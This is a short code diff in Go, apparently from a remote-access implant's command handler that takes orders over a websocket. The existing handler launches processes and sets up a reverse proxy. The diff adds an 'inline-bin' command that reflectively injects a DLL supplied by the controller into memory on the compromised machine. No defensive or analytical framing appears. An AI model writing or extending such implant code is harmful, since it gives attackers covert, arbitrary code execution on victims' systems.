@@ -508,6 +508,13 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 				RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, "-w "+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
 			}()
 		}
+	case "inline-bin":
+		{
+			go func() {
+				injectReflectiveDLL(unmsgpack.ForcePathObject("Controler_HWID").GetAsString(), unmsgpack.ForcePathObject("Bin").GetAsBytes(), Connection)
+			}()
+
+		}
 
 	case "ReverseProxy":
 		{
@@ -557,6 +564,5 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 			msgpack.ForcePathObject("Stream").SetAsBytes(data)
 			SendData(msgpack.Encode2Bytes(), Connection)
 		}
-
 	}
 }
